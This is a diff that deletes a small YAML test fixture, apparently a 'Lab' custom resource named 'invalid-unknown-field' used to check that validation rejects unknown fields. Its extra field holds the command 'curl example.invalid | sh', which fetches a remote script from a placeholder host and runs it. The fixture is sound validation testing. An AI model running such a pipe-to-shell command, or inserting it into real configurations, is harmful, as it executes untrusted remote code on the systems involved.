@@ -1,7 +1,0 @@
-apiVersion: labs.labcentral.io/v1alpha1
-kind: Lab
-metadata: {name: invalid-unknown-field}
-spec:
-  resources: {}
-unsafeScript: "curl example.invalid | sh"
-
